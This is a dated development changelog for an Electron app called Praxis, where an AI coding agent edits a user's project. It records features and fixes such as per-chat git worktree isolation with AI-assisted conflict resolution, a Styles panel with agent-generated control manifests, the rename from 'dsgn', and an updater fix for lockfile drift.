  renderer is React 18. The vanilla `FileTree` class renders into its own shadow
  root via Preact — fully decoupled from our React — so `FileTreePanel.tsx` just
  mounts it imperatively in a `useEffect` and bridges selection ↔ the drawer.
- New `src/main/file-tree.ts` + `source:tree` IPC lists the project's files:
  `git ls-files` (tracked + untracked-not-ignored) for repos, bounded fs-walk
  fallback (skips node_modules/dist/etc.) for non-git folders. POSIX paths,
  sorted, capped at 20k. Unit-tested in `test/file-tree.mjs` (unit tier).
- CodeDrawer window variant relaid out as a row (tree aside + editor column); the
  macOS traffic lights now float over the sidebar, so a draggable spacer clears
  them and the header dropped its `pl-20` inset.
- Toolbar: the **"Editor"** button is now **"IDE"** (icon dropped); the top-right
  **close** button is hidden in the pop-out (its native traffic lights close it)
  and kept only on the docked drawer.

Typecheck + build green; `test:file-tree` green. The Electron UI tiers couldn't
run in this headless session (no display — even unmodified UI tests fail to
launch); the tree render itself needs a manual `bun run dev` check.
## 2026-07-22 — `praxis --update` no longer aborts on install-generated lockfile drift

`praxis --update` was failing at its first step with `git pull --ff-only`:
> error: Your local changes to the following files would be overwritten by merge: bun.lock

Root cause: `bun install` (run by the updater itself, and by every `dev`/`build`)
rewrites the tracked `bun.lock` as a side effect, so a checkout that's been built
once always carries a dirty, machine-authored lockfile. `--ff-only` refuses to
run over it. This bites every user on their second update.

Fix (`bin/praxis.mjs`): before pulling, discard dirty tracked lockfiles back to
HEAD — safe because the very next step (`install`) regenerates the lockfile
against the pulled `package.json`. Only the machine-generated lockfiles are
touched (`bun.lock`/`bun.lockb`/`package-lock.json`/`npm-shrinkwrap.json`/
`yarn.lock`/`pnpm-lock.yaml`); real source edits still hit the existing
"commit or stash" error. The decision is a pure exported helper
`lockfilesToRestore(porcelain)`, unit-tested in `test/praxis-cli.mjs` (added to
the `unit` tier + a `test:praxis-cli` alias). To make the module importable by
the test, the bottom-of-file `main()` call is now guarded by `invokedAsScript()`
(realpath-compares `argv[1]` to the module, so the PATH symlink install.sh
creates still runs the CLI). Verified end-to-end against a temp repo: the
original failure reproduces, and after the restore the fast-forward pulls both
upstream's `bun.lock` and a new file cleanly. Unit tier 28/28 green.

## 2026-07-19 — Merged origin/candidate (Styles/Custom-controls) into the rename branch

Integrated the 14-commit Styles-panel + Custom-controls feature that landed on
`origin/candidate` while the dsgn→praxis rename was in flight. 11 conflicts, all
the same shape (upstream's new feature code vs the rename's naming) — resolved by
taking upstream's side, then re-running the mechanical `dsgn→praxis` sweep over
the merged tree (excluding the deliberate legacy shims + PROGRESS history). This
also caught the `dsgn` references in the newly-added Styles files (they predated
the rename): `data-praxis-source`, `.praxis/control-panels.json`, `PRAXIS_RULES_VERSION`,
`praxisRules`, `praxis:preview:*` channels, etc.

Watch-outs handled:
- `git checkout --theirs` on `api.ts` dropped the WIP conflict-UX API members
  (`agent.resolveConflict`/`discardConflict`) since it takes the whole file — re-added them.
- `test/rules.mjs`'s stale-header assertion got over-swept again (it intentionally
  names the OLD header): reset to guard `dsgn operating rules`, header is `Praxis`.
- New sidecar `.praxis/control-panels.json` added to `sidecar-migrate.ts`'s move list
  (same class as annotations/tokens); the agent write-deny already covers it via SIDECAR_RE.
- `RULES_VERSION` is now 4 (upstream bumped it for `define_controls`).

Typecheck + unit + electron tiers green.

## 2026-07-18 — Send feedback moved from the entry screen to the sidebar

The empty state's "Send feedback" button is gone (per user call); the rail now
pins one at its bottom-left (below any update banner, outside `rail__inner`'s
scroll), opening the same FeedbackDialog. `styles.css` already carried the
`.rail__feedback` block — this wired up the markup it was written for. The
feedback-dialog test seeds a fake workspace entry (rail only renders with a
project open) and clicks the pinned button.

## 2026-07-17 — Renamed the `dsgn` internals to Praxis (clean break + legacy shims)

Swept the pre-rename `dsgn` name out of the code (~900 occurrences, 111 files):
`data-praxis-source` / `data-praxis-component-source` stamps (RN testID prefix
`praxis:`), `.praxis/` sidecar, `PraxisApi`, `praxis/*` work branches,
`<userData>/praxis` data dir, `PRAXIS_DEBUG_PORT`, `__praxis*` test hooks,
`mcp__praxis__*` tools. Entries in THIS file keep their historical wording.

**Clean break for stamped target repos** (per user call): the old
`data-dsgn-source` attribute is NOT read anymore — old instrumented repos get
the setup offer again. Deliberate legacy shims, and only these:

- `setup.ts` uninstall also removes the old `.dsgn/` helpers + root plugin.
- `git.ts` `isWorkBranch` — a repo already on a `dsgn/*` branch keeps it
  (never nests `praxis/dsgn/…`); publish keeps working from it.
- `sidecar-migrate.ts` (new, pure; hooked into `project:detect`) — one-time move
  of `.dsgn/{annotations,tokens}.json` into `.praxis/`; helpers stay put because
  the target repo's build config may still reference them. Unit-tested
  (`test/sidecar-migrate.mjs`).
- `agent.ts` `dataDir()` — one-time `<userData>/dsgn` → `<userData>/praxis`
  rename + `git worktree repair` per chat worktree (their `.git` back-pointers
  hold absolute paths).
- The agent sidecar write-deny (`tools.ts` SIDECAR_RE) covers `.praxis` AND
  `.dsgn`.

Also fixed sed-self-defeats in tests (`rules.mjs` stale-header check,
`setup-detect.mjs` legacy filenames), the `bun.lock` workspace name, and the
fixture dir `test/fixtures/tokens-priority/.dsgn` → `.praxis`. lkmv.ch (the one
instrumented repo) re-instrumented by hand in the same sweep.

Piggybacked (same file was rename-touched anyway): `test/chat-isolation.mjs`
part B still asserted the composer "Isolated"/"Parked" chips that the
2026-07-16 conflict-UX chunk deliberately removed — updated it to the new
contract (merged → store state + note, no card; parked → ConflictCard pinned
with the affected files + history reload). Full unit + electron tiers green.

## 2026-07-16 — Parked-chat conflict UX: sidebar badge + AI "Resolve it" card

Made the per-chat isolation "parked" state (a turn whose changes couldn't auto-merge because the user edited the same files) legible and actionable, instead of a cryptic note pointing at the sidebar.

- **Sidebar badge** — a live chat whose `isolation === 'parked'` shows an amber **"conflict"** pill on its rail row (`Rail.tsx`, `.rail__chat-badge` in `styles.css`). While a project has a parked live chat, its redundant `chatpark-*` history row is hidden from "previous chats" (the badge + card own that state now).
- **In-chat ConflictCard** (`src/renderer/src/components/ConflictCard.tsx`, mirrors `SetupCard`) — pinned above the composer while parked. Plain-language explanation ("This chat edited files that also changed in your project…"), the affected file chips, and two actions: **Resolve it** and **Discard changes**. Replaces the old `appendNote` warning; the small composer "Parked" chip was removed.
- **"Resolve it" = AI reconciles** (per user steer — most users won't touch git markers). New `stageResolve` (`chat-worktrees.ts`) resets the chat's worktree onto the user's live tree and 3-way re-applies the chat's diff, so the worktree holds BOTH sides. If they don't overlap it merges cleanly and `resolveParkedChat` (`chat-isolation.ts`) commits + merges + unparks with no agent turn. If they overlap, it leaves conflict markers and returns the files; `agent:resolve-conflict` hands back a resolution prompt the renderer runs as a normal turn, whose `afterTurn` merges + unparks. **Discard changes** → `agent:discard-conflict` → `discardParkedChat` (resets the worktree, unparks).
- **IPC:** `agent.resolveConflict()` / `agent.discardConflict()` (api + preload + handlers), keyed by the active session so the renderer never needs the branch name. Store: `ChatSlice.isolationFiles` carries the parked files to the card; `setIsolation(key, state, files)`.

**Known limits:** if the AI resolution turn leaves markers unresolved (or errors), `afterTurn`'s auto-apply can write them to the live tree — the prompt strongly instructs removing all markers. On reload the card shows without its file list (the snapshot doesn't carry files; resolve still works — main recomputes).

**Tests:** extended `test/chat-worktrees.mjs` with `stageResolve` cases (non-overlapping drift → clean auto-merge + landed on live; overlapping drift → conflict markers carrying both sides). Typecheck + build green.
## 2026-07-18 — Styles tab (Dialkit-style controls) + AI-surfaced custom controls

The island panel is now tabbed: **Props | Styles | Custom**. Styles gives direct,
scrub-to-adjust control over the v1 CSS set (padding/margin/gap, colors, radius,
opacity, the type properties, and transitions incl. a draggable cubic-bezier
editor). Custom appears when a component has an AI-generated control panel —
the user asks Praxis to "surface controls" for something the automatic paths
can't see, and the agent instruments the source and registers a manifest.

**Why a hybrid commit path.** A scrub has to end up in source, and there are
three honest outcomes: the element uses utility classes → rewrite the class
(`p-4` → `p-[13px]`, named-scale snap where one exists); it doesn't → splice an
inline style; the site is dynamic (spread, `style={expr}`, ambiguous class
family) → hand it to the agent, the same `needsAgent` escape prop editing
already uses. Everything commits through `commitEdit`, so HMR and undo come
free, and edit-history's 500ms coalescing means one scrub burst is one Cmd+Z by
construction rather than by bookkeeping. Live feedback while dragging is CSS
injected into the preview (`styles:preview`), reverted from a stash bound to the
element it was taken from; after a commit the panel lifts its own override
before re-reading, so the reconcile compares against real source output instead
of reading back its own injection.

**Why manifests store no values.** A control panel is metadata: which parameter,
how to reach it, what range. Values are re-resolved on every lookup — literals
by lexing the literal that follows a unique anchor string, props from the live
inspection, styles from computed styles. Staleness then handles itself: moving a
constant is invisible, renaming one marks that param stale with a reason and a
Regenerate button, and no cache can drift from the file. Anchor uniqueness is
re-checked at save and again at every apply, so a manifest can never splice the
wrong site; main renders every literal it writes (clamped, quoted, markup
rejected) because the manifest is agent-authored and therefore untrusted.

**The worktree trap.** `define_controls` runs in the chat's worktree, so the
naive `saveManifest(root, …)` would have written the manifest somewhere that
merges back later — or not at all. `SpawnContext.liveRoot` now carries the true
project root; the callback validates anchors against the worktree file the agent
just wrote and persists to the live tree. Mid-turn the manifest may reference a
constant that only exists in the worktree, so it resolves as stale until the
merge lands and the Custom tab flips live on the turn's `done` (and `error` —
the worktree merges back there too, to salvage interrupted edits).

**Non-Claude backends** get no custom tools, so the trigger prompt branches: the
agent exposes typed props with literal defaults and the Props tab picks them up
on re-inspect. The prompt does the instrumenting either way — steering constants
into the component's own file, which is also what keeps a literal scrub on a
fast react-refresh boundary instead of a full page reload.

**Notable calls:** literal params have no live-preview channel (an arbitrary
constant can drive anything), so they commit at a 250ms trailing cadence and the
file write through HMR *is* the preview; the transition-property select is a
native `<select>` because a portal dropdown would clip at the island view's
edge; ScrubInput uses pointer *lock*, not capture, since capture dies at that
same edge, and exiting the lock commits rather than reverts.

**Tests:** `tw-styles`, `inline-style`, `css-values`, `control-panels` (unit);
`style-edit` and `custom-controls` (Electron, driving the real island UI and
asserting on disk, with island screenshots in `test/artifacts/`);
`controls-agent` (live tier, self-skipping) runs a real turn and asserts a valid
manifest lands in the live tree — it passed end to end, which is what proves the
`liveRoot` path.

**Known limits:** computed px is accepted where source authored rem (named-scale
snapping recovers it in the Tailwind case); a `cn(...)` element falls to the
inline path and leaves the old utility in place; no springs/framer-motion, no
width/height or box-shadow, no responsive/state variants; navigation wipes the
preload's selection state and the panel asks for a re-pick rather than
re-resolving.

## 2026-07-16 — Per-chat worktree isolation with merge-back

Multiple concurrent chats on the same project can now run in isolation without clobbering each other's edits. Every interactive chat (default, new-chat, resumed) on a git repo root gets its own long-lived git worktree on branch `dsgn/chat-<id>`; edits from each turn are committed to that branch, then merged back to the live tree at turn end (on `done` and `error` events). The preview always serves the live checkout and reflects merged edits between turns.

**Design:** the core git machinery (`createWorktree`, `commitWorktree`, `autoApplyWorktree`, `removeWorktree`, `pruneOrphans`) already existed from v8's comment-spawn feature and is reused without modification. Two new pure modules coordinate the per-chat lifecycle:

- **`src/main/chat-worktrees.ts`** (~185 lines, unit-tested): state-free turn operations — `syncFromLive` (drift sync at turn start), `completeTurn` (commit + merge decision), `applyParked` / `discardParked` (conflict-park review actions).
- **`src/main/chat-isolation.ts`** (~280 lines, Electron-coupled): per-chat lifecycle and state — `initChatIsolation`, `isolatedCwd` (route new sessions through their worktree), `adoptSession` (stamp record back to live values for reload reattach), `beforeTurn` / `afterTurn` (turn chain serialization), `releaseChat`, `liveChatWorktreeIds`, `handleReclaimed` (crash recovery).

**Turn flow:** on `agent:send`, await `beforeTurn` to serialize drift-sync and drain any in-flight post-`done` merge from the prior turn. On turn end (`done` / `error`), fire `afterTurn` (queued on the per-chat chain) to commit + attempt auto-apply. If applied, edits are recorded as one undo group per turn and the base is advanced so the next turn sees only new drift. If refused (conflict / binary / write failure), the work parks on the branch as a persistent commit; the chat gets a warning note and the branch surfaces in the sidebar for review — `SessionReview.tsx` gates Apply/Discard/PR on `kind === 'comment' && !!branch`, reusing the spawn review UI. Parked chats re-attempt auto-apply on every `done` (self-heals when drift resolves).

**Lifecycle & crash recovery:** worktrees created on session start (`agent:new-chat`, `agent:resume-session`, `agent:open-project`); removed on session close after a final completeTurn. Restart (model picker) reuses the existing worktree. `open-project`'s `pruneOrphans` crash-recovery skips live chat worktree ids (one global `liveChatWorktreeIds()` call covers all open projects), recovers dirty orphaned `dsgn/chat-*` branches as park records, and deletes clean unrecorded branches only if all files already match the live tree (closing a commit-before-merge crash data-loss window).

**IPC:** new `isolation` event type in `AgentEvent` (no new channels); lives in the chat's `LiveChatSnapshot` for reload reattach. `agent.ts` spawn projectKey fix lands here too: `startSpawn` now stamps `s.record.projectKey = q.parentKey`, fixing spawn records' invisibility to `sessions:list`.

**Known limits:** resumed sessions get a fresh worktree; agent writes via absolute live-root paths escape the worktree (mitigated by a rules.ts note); heavy mid-turn live editing (prop panel during long turns) parks often.

**Tests:** `test/chat-worktrees.mjs` (unit, pure git repos), `test/chat-isolation.mjs` (Electron, real app), existing fixtures on the live-cwd path unchanged.
## 2026-07-16 — User-visible "dsgn" mentions replaced with "Praxis" (LKM-57)

The old product name still leaked into user-facing copy (setup card, prop-panel
hints, diagnose card, auth banner, preview context menu, dev-server conflict
error, publish/PR titles + bodies, scaffolded template, worktree git author).
All of it now says **Praxis**; the comment-agent PR body also pointed at the
old `alikimovich/dsgn` repo URL — fixed to `alikimovich/praxis`.

Deliberately **kept** (protocol/identifiers, per CLAUDE.md): `data-dsgn-source`
stamps, the `.dsgn/` dir + helper file names, the `dsgn/*` branch prefix (the
publish-from-base error now reads "a Praxis work branch (dsgn/*)"),
`?dsgnPanel`/`?dsgnSim` flags, storage keys, and `Dsgn*`/`dsgn*` type and
function names. The scaffolded `.dsgn/` helpers' prose comments say Praxis but
their plugin names/exports are unchanged. Tests updated:
`test/publish-message.mjs`, `test/ready-gating.mjs`.

## 2026-07-16 — Empty chats get no rail row until their first message (LKM-55)

Mashing the rail's "+" minted a new live session every click, filling the rail
with identical "New chat" rows — unlimited empty chats.

- **Rail** now skips live chats whose slice has no messages: a chat's row
  appears only once its first message is sent (Cursor-style). An empty chat has
  nothing to name or return to; past/spawn rows are unaffected.
- **App's `newChatForProject`** reuses an existing empty live chat (switches to
  it) instead of stacking another session — an empty chat already IS a "new
  chat", so "+" is idempotent until you actually type something.
- Tests: `test/chat-render.mjs` asserts empty chats render no rows, "+" with an
  empty chat live doesn't grow `sessionKeys`, and rows appear per-chat as each
  first message lands.

## 2026-07-16 — Project skills first in the "/" menu, with descriptions (LKM-54)

The composer's "/" menu listed the SDK's advertised command names flat, so the
opened repo's own skills (`.claude/skills/**/SKILL.md`) drowned among built-ins
and had no descriptions.

- **`AgentEvent` `commands` now carries structured items** —
  `SlashCommandItem { name, description?, source: 'project' | 'other' }`
  (`shared/api.ts`) instead of bare strings.
- **New `src/main/skills.ts`** (main-process — the renderer stays free of fs
  reads): `discoverProjectSkills(root)` scans `.claude/skills` (nested dirs
  tolerated) and pulls `description` from each SKILL.md's YAML frontmatter with
  a defensive no-dependency parser (plain/quoted/block scalars; malformed input
  degrades to an undescribed item, never breaks the menu);
  `mergeSlashCommands(project, sdkNames)` ranks project skills first and lets a
  project skill shadow a same-named SDK command.
- **`backends/claude.ts`** discovers once per session and re-emits the merged
  list whenever either side (project scan, `supportedCommands()`, the init
  message's `slash_commands`) arrives.
- **`ChatPanel`** filters by name, keeps project-first ranking + dedupe on the
  render side too (guards store seeds/other backends), and renders two-line
  items: `/name` plus the description truncated to one visual line (`truncate`).
  Filtering, keyboard nav, click-to-insert, and the 8-item cap are unchanged.
- Tests: `test/skills-discovery.mjs` (unit tier — parse/scan/merge);
  `test/chat-render.mjs` now asserts priority order, duplicate collapse,
  description fallback, one-line ellipsis truncation, and Enter/click insertion.

## 2026-07-15 — Attach arbitrary files (not just images) to the chat

The composer only accepted images (read into base64, sent as vision blocks).
You can now drop **any** file into the message area: non-image files are handed
to the agent **by absolute path** (it reads them with its own tools) and shown
as a filename card next to the image thumbnails.

- Images are unchanged (still base64 vision blocks). Only non-image drops/pastes
  take the new by-path route, split in a shared `addDroppedFiles` helper.
- A new preload bridge `pathForFile` wraps `webUtils.getPathForFile` — Electron
  43 removed `File.path`, so the real on-disk path must be recovered in the
  (sandboxed) preload. Pathless blobs (e.g. an in-memory clipboard file) yield
  '' and are skipped.
- No IPC contract change: file paths are folded into the existing `agent.send`
  text argument (a `[Attached files]` block prepended like the selection `ctx`),
  so `ImageAttachment`/`agent:send` stay as they were.
- `test/chat-render.mjs` now drops a real file via a hidden `<input type=file>`
  (so `getPathForFile` resolves a true path — a synthetic `File` has none),
  asserting the filename card renders and removes. It also fixes a stale
  assertion there that still expected the permission-mode selector to be absent
  after a612f83 restored it.

## 2026-07-15 — Keep agent model choices with their individual chats

The model/backend picker lived in the renderer-wide session store, so selecting
a model in a newly created chat made an older chat *display* that new model when
the user returned to it. Live chats now retain their own model, provider, and
reasoning-effort settings in their workspace entry; the picker mirrors only the
currently selected chat and restores that chat's saved settings on every rail
switch.

- A new chat inherits the choices of the chat it was created from, then diverges
  independently. Older workspace data without settings safely uses defaults.
- Codex must choose its model when it starts. A new `agent:restart-chat` IPC
  therefore replaces only the selected Codex chat when its model or provider
  changes — it no longer reopens the project's default chat and accidentally
  affects a sibling.
- `test/chat-render.mjs` now covers new-chat model selection followed by switches
  back and forth between two chats, asserting that each picker is restored.
## 2026-07-15 — Keep images + selection visible in sent chat bubbles (LKM-53)

Attached images and the selected-element pill were shown in the composer but
disappeared the instant you sent the turn — the message bubble only rendered
text, so the transcript lost the visual context of what the ask was about.

- **`ChatMessage` carries the extras.** Two new optional fields (`store.ts`):
  `attachments` (image thumbnails — `{id, mediaType, url}`) and `selection` (a
  display-only `{tag, ident, source}` snapshot). `appendUser` gained an `extras`
  arg to attach them; `selectionForBubble(el)` builds the snapshot, mirroring the
  Inspector pill's `#id`/`.class` identifier logic so live pill and sent pill match.
- **`send()` passes them through.** `ChatPanel.send` maps the composer's
  `attachments` + current `selected` onto the appended user message. The model
  still gets the selection as hidden prompt context (`describeSelectionForPrompt`
  prefix), unchanged — only the bubble is new. Dropped the old
  `🖼 N image(s)` placeholder text; the thumbnails stand in for it now.
- **Render.** User bubbles now show the selection pill + image thumbnails above
  their text (right-aligned to match `.msg--user`).
- **Known limit:** images aren't persisted to the on-disk transcript, so a
  reloaded/resumed chat won't re-show them (the selection still survives as the
  prompt-prefix text it always did). In-scope fix is the live send experience.
- `test/chat-render.mjs`: a sent user turn keeps its thumbnail + pill.

## 2026-07-14 — Pop the code drawer out into its own window (LKM-48)

The v9 code drawer was locked to the strip under the preview. You can now pop it
into a standalone, freely-resizable native window.

- **New window = same bundle, new entry.** `main/index.ts` `openEditorWindow`
  opens a `BrowserWindow` running the renderer with `?dsgnEditor=1&root=…&source=…`
  — the same trick the `?dsgnPanel` prop-island uses. `main.tsx` routes that query
  to a new `EditorWindow` component (renderer/src/components/EditorWindow.tsx),
  which renders the editor full-window instead of `<App>`. Reuses CodeMirror, all
  `source:*` IPC (same preload), and the app theming for free.
- **One window per project root.** `editorWindows` is keyed by root: a second
  pop-out for the same project re-focuses the open window and retargets it at the
  new file via an `editor:navigate` push (`source.onNavigate` in the preload)
  rather than stacking duplicates. The rail keeps several projects open, so
  different roots each get their own window.
- **`CodeDrawer` grew a `variant` prop.** `'drawer'` (default) is unchanged;
  `'window'` fills `h-screen`, reserves **no** preview inset (`usePanelInset`
  early-returns), and drops the drawer-only chrome (resize handle, expand toggle).
  The header doubles as the macOS `hiddenInset` title bar — left-padded past the
  traffic lights, with the file-name span as the drag region so the buttons stay
  clickable. Cmd+click nav + back/forward still work: `EditorWindow` drives the
  drawer off the store, so jumps navigate within the popped-out window.
- **New IPC** (`src/shared/api.ts` + preload + `registerEditorIpc`):
  `source.popout(root, source)`, `source.closeWindow()` (a popped editor closing
  itself), `source.onNavigate(cb)`. A new **pop-out** button sits in the docked
  drawer's header; clicking it opens the window and closes the docked strip.
- `test/code-drawer.mjs` extended: the pop-out button opens a second window
  running the `.codedrawer--window` variant (no resize handle), releases the
  drawer inset, and its close button closes the window. (Electron UI tier —
  needs a display; can't run on a headless runner.)

## 2026-07-12 — Auto-name chats by subject, not opening words (LKM-45)

The rail named a chat by truncating its first user message (`chatTitle` +
`firstUserText`), so a chat that opened "Hey, can you help me…" got that literal
string as its name instead of what it turned out to be about. Now the backend
**summarises the conversation into a short title** once a chat's first turn
finishes.

- **Backend seam.** New optional `ModelProvider.generateTitle(transcript,
  options)` — a one-shot, tool-less `query()` (Claude backend). It runs with
  `settingSources: []` (no repo CLAUDE.md/skills) and denies every tool via
  `canUseTool`, so it can't touch the repo or drift into work; a 20s abort +
  catch-all makes it strictly best-effort (any failure → null). The pure
  transcript-digest / output-sanitiser helpers live in `backends/title.ts` (kept
  Electron-free so they unit-test in bun — `test/chat-title.mjs`).
- **Trigger.** `agent.ts` fires `maybeGenerateTitle` off each interactive
  session's `done` event (new `interactiveEvents` hook wraps `trackRunning`).
  Runs **once per chat** (guarded by `record.title`), only when both sides have
  spoken, sets `record.title`, and emits a new `{ type: 'title' }` AgentEvent.
  A resumed chat carries its prior `record.title` forward so it keeps its name.
- **Renderer.** ChatPanel routes the `title` event to `useChat.setTitle`; the
  rail prefers `slice.title` / `rec.title` and falls back to the old
  first-message heuristic until a title exists. `restore.ts` re-seeds the title
  on reload from the persisted record. Backends without `generateTitle`
  (Codex/Gemini) simply keep the heuristic name.

## 2026-07-11 — Codex: don't nag on switch, and give it its own model picker (LKM-42)

Two Codex UX bugs. **(1) The `codex login` hint showed on *every* switch to the
Codex backend**, even for an already-connected user — the render guard was just
`if (!p?.login)`. Gated it on a new `codexAuthNeeded` store flag that's raised
only when a Codex turn actually reports an auth/"not connected" error (mirrors
`authNeeded` for Claude, kept separate so the Claude onboarding banner never
fires for a Codex failure). `isAuthError` now also matches Codex's `sign in` /
`codex login` phrasings. **(2) The model picker always listed Claude's models**
(opus/sonnet/haiku), so on Codex you couldn't pick a real model and selecting one
handed a Claude name to Codex → the turn failed. The picker now switches per
backend via `modelsFor(provider)` (Codex → Default / GPT-5 Codex / GPT-5), and
because Codex fixes its model at `startThread`, `onModelChange` reopens the
session on the new model instead of a no-op live `setModel`. Switching backend
resets the model to Default (names don't cross providers).

- **Gotcha fixed in the same pass:** Codex's backend emits `done` after *every*
  turn — including the failed auth turn, right after the `error` that raises the
  hint. Clearing `codexAuthNeeded` on `done` (as the first cut did, copying the
  Claude path) would wipe the hint the instant it appeared, so it's now cleared
  only on a real `delta` (streamed output = genuinely connected). Claude keeps
  clearing on `done` because its backend only emits `done` on success.
- `test/chat-render.mjs` extended: hint stays hidden on switch, the model picker
  lists Codex models (not `opus`), and the hint appears once `codexAuthNeeded` is
  raised. (Electron UI tier — needs a display; can't run on a headless runner.)

## 2026-07-11 — Regression-test the mid-message "/" menu trigger (LKM-37)

The "/" skills menu already opened mid-message (it reads the "/" token the caret
sits in via `/(?:^|\s)\/(\S*)$/`, so it fires at the start or after whitespace but
not when a non-whitespace char precedes "/"), but the parsing lived inline in
`ChatPanel` with no coverage. Extracted it to a pure, string-only
`src/shared/slash-token.ts` (`parseSlashToken`) and added `test/slash-token.mjs`
(unit tier) locking the behavior: opens at start and after space/newline/tab,
stays closed for `foo/bar`, `a/`, `http://x`, and once a trailing space ends the
token. `ChatPanel` now calls the shared helper — no behavior change, just testable.

## 2026-07-10 — Discoverable "Edit text" in the preview toolbar (LKM-38)

Inline text editing already existed (double-click a stamped, text-only element in
Select mode → contentEditable → source splice; see 2026-06-24), but it was a
hidden gesture with no on-screen affordance, so it read as "gone". Re-surfaced it
as an explicit **Edit text** button on the in-preview selection toolbar.

- **`edit` icon button** (pencil) added to the toolbar pill in `preview/preload.ts`,
  in DOM order `comment, annotate, [input], edit, props, code | delete`. It shares
  the *exact* edit engine as the double-click: `onDblClick` and the button both
  call a new `startTextEdit(el)` (extracted from the old `onDblClick` body).
- **"When it's possible"** — `isTextEditable(el)` gates the button: a directly-
  stamped element with no child elements and not a void/replaced tag
  (`img`/`input`/`svg`/…). `setEditAction()` shows the button only for such a
  selection (mirrors `onDblClick`'s guard), and `setTrailingActions` hides it
  while the comment/annotate input is open. Non-text or expression content still
  falls back to the agent on commit, unchanged.
- `test/select-element.mjs`: toolbar order assertion now expects the `edit` kind
  and that it renders visible for the plain-text `#hero-title`; a new step clicks
  the Edit button and asserts it arms `contenteditable="plaintext-only"`, then
  Escapes to cancel. (UI tier — needs a display; typecheck green.)
## 2026-07-10 — Agent knows it's in Praxis; preview becomes a pair of tools

Rules v3 (`main/rules.ts`, `dsgnRules(opts?)`): the product is named **Praxis**
in the agent-facing text (identifiers unchanged), the opening context tightened
(designer pointing at UI, `data-dsgn-source` file:line selections, instant
HMR), and a new `previewTools` flag gates a "Seeing the user's preview" section
so Codex/Gemini never hear about tools they don't have.

The silent per-message "The preview is currently showing <path>." prefix is
GONE (ChatPanel no longer prepends it; `describePreviewLocationForPrompt`
removed; `usePreviewLocation` stays for UI). Instead the Claude backend now
registers Praxis's first in-process SDK tools via `createSdkMcpServer`:

- `mcp__praxis__preview_location` — the agent asks where the user is when the
  page actually matters (live SPA URL from the preview webContents; "No project
  preview is open." on the placeholder).
- `mcp__praxis__preview_screenshot` — exactly what the user sees (their route,
  viewport, simulator): `capturePage()` downscaled to ≤1200px JPEG, returned as
  an MCP image block.

Both are read-only and never raise a permission card (`allowedTools` + a
`canUseTool` early-allow). A new `main/preview-state.ts` registry hands the
preview URL/capture to the backends without an index.ts↔backends import cycle.
A bundled plugin (`agent-plugin/` at the repo root, wired via the SDK `plugins`
option when present) ships a `praxis-preview` skill teaching the workflow:
observe with the tools, interact via `agent-browser`, verify visual changes
with a screenshot. `test/rules.mjs` pins v3 + the gating;
`test/preview-location.mjs` now asserts the composer does NOT prepend.

## 2026-07-10 — Drag-resize the code drawer (LKM-35)

The bottom code drawer (`CodeDrawer.tsx`) can now be resized by dragging its top
edge, not just toggled between the fixed 300px height and expanded.

- **A `.codedrawer__resize` handle** straddling the top border (`absolute -top-1
  h-2`, `cursor-ns-resize`, `role="separator"`). `onPointerDown` captures the
  start Y + current height and installs window `pointermove`/`pointerup`
  listeners (so the drag survives the pointer leaving the thin strip); each move
  sets an explicit `dragHeight` from the vertical delta (up = taller). Arrow
  Up/Down on the focused handle nudges it 24px for keyboard users.
- **Height precedence:** `dragHeight` (if set) → `expanded` → default `DRAWER_H`.
  All pass through `clampHeight` to `[MIN_DRAWER_H (120), maxHeight]`.
  `maxHeight` = `min(80% of the window height, containerH − MIN_PREVIEW)`, so the
  drawer never exceeds 80% of the viewport and never fully hides the preview. A
  window `resize` listener tracks `viewportH` so the ceiling stays live; the
  render-time clamp keeps a stored `dragHeight` from stranding out of range.
  The expand toggle clears `dragHeight` so it reclaims precedence.
- `test/code-drawer.mjs` extended: drag the handle to the top of the window and
  assert the reserved inset grows but stays ≤ 80% of `window.innerHeight`.

## 2026-07-10 — Close individual live chats from the rail (LKM-34)

Each live chat row in the rail now carries the same hover-revealed × the past
chats and spawns already had — so a user can close ONE of a project's open chats
without closing the whole project.

- **New `agent:close-chat` IPC** (`root`, `sessionKey`): tears down just that
  session via the existing `closeSession` (so a closed chat persists to history
  and becomes a resumable "previous agent", exactly like project close), then
  re-points the project's active chat to a survivor (prefers the default `key`).
  Returns `{ remaining, activeSessionKey }`; `activeSessionKey` is null when no
  chat remains. If the closed chat was the globally active one, `activeKey`
  follows the survivor (only while the project is still intended-active — never
  resurrects a backgrounded session into a chat the renderer isn't showing).
- **Renderer `closeChatForProject(key, sessionKey)`** (App): closing a project's
  LAST live chat falls through to `closeProjectFromRail` (nothing left to show);
  otherwise it awaits the IPC (so main disposes before the slice is cleared —
  a trailing emit can't resurrect it), drops the `useChat` slice, rewires the
  entry's `sessionKeys`/`activeSessionKey`, and switches the visible chat only
  when the closed one was the active chat on screen.
- Wired through `shared/api.ts` + the preload bridge + a new `onCloseChat` Rail
  prop; the × reuses the existing `.rail__chat-x` styling (hover-to-reveal).
  `test/agent-multi.mjs` extended: open a 2nd chat, close only it, assert the
  project stays live and the closed key is gone from `remaining`.

## 2026-07-09 — macOS: sidebar vibrancy behind the rail

The main window's base is now the NSVisualEffect *sidebar* material instead of
a solid white/dark fill (macOS only; Windows/Linux keep the theme color).
Electron allows ONE vibrancy material per window (a true multi-material split
needs a native NSVisualEffectView addon — the old `electron-vibrancy` package
is dead, NAN-era, won't build on Electron 43), so the split is CSS zones over
the material:

- rail → fully transparent (raw sidebar material),
- chat + preview panes → opaque `--bg` (tried translucent washes first; the
  content areas read better solid),
- Welcome screen (`.empty`) → light `--vib-main` `--bg` wash so an empty
  window still shows the material.

`createWindow` skips the opaque `backgroundColor` on darwin (it would paint
over the material — the nativeTheme re-apply skips the window there too);
`main.tsx` stamps `html.vibrancy` (main window only, never the prop-panel
island). Component fills (cards, modals, buttons, inputs) stay opaque. Theme
always follows the OS, so the material and the token palette can't disagree.

## 2026-07-09 — Rail: folder-icon projects + Cursor-style chat list (LKM-28)

Reworked the left rail's per-project display to match Cursor. Each project now
leads with a **folder icon** (`FolderOpen` when it's the active project,
`Folder` otherwise) in place of the old status dot. The active project expands
to a single **flat, left-aligned chat list** whose text lines up under the
project name (row left-padding = glyph + gap), replacing the two separate,
indented, dot-prefixed sub-lists (live-chat switcher + "previous agents").

- **One list, no dots.** Live/open chats come first (the active one gets a
  full-width highlight pill), then previous chats (persisted `SessionRecord`s),
  then any comment-spawn rows. The only remaining dot is the spawn status dot;
  chat rows carry no status badge (per the request).
- **Auto-named chats.** `chatTitle()` (store) derives a short name from a chat's
  opening user message — live chats read `useChat`'s first user message, past
  chats read `rec.transcript`'s. Empty chats fall back to "New chat".
